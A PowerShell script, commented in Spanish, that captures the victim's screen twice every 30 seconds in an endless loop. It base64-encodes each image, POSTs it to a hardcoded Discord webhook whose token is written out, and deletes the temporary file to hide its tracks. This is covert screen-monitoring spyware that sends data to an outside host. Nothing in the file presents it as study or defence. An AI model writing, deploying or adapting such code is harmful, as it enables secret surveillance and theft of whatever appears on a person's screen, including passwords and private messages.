# Función para tomar una captura de pantalla y enviarla al webhook
function Send-ScreenshotToDiscord {
    # Definir la URL del webhook de Discord
    $webhookUrl = "https://discord.com/api/webhooks/1203343432970539008/JjFQGyK8MZw2qySfc4jYTPw0jzsH2HKaKAaaQ27uyrllfMIVaDqEUi_ZywclJBmWpxJp"

    # Definir el nombre del archivo de la captura de pantalla con fecha y hora
    $fileName = "$env:TEMP\SC_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
    
    # Tomar la captura de pantalla
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
    
    # Guardar la captura de pantalla en un archivo
    $bitmap.Save($fileName, [System.Drawing.Imaging.ImageFormat]::Png)
    
    # Formatear la fecha y hora actual
    $dateTime = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
    
    # Enviar la captura de pantalla al webhook de Discord con la fecha y hora
    $file = [System.IO.File]::ReadAllBytes($fileName)
    $base64File = [Convert]::ToBase64String($file)
    $data = @{
        content = "Screenshot at $dateTime:"
        file = "data:image/png;base64,$base64File"
    } | ConvertTo-Json
    Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "application/json" -Body $data
    
    # Eliminar el archivo de la captura de pantalla
    Remove-Item -Path $fileName
}

# Bucle principal: tomar dos capturas de pantalla cada 30 segundos
while ($true) {
    Send-ScreenshotToDiscord
    Send-ScreenshotToDiscord
    Start-Sleep -Seconds 30
}
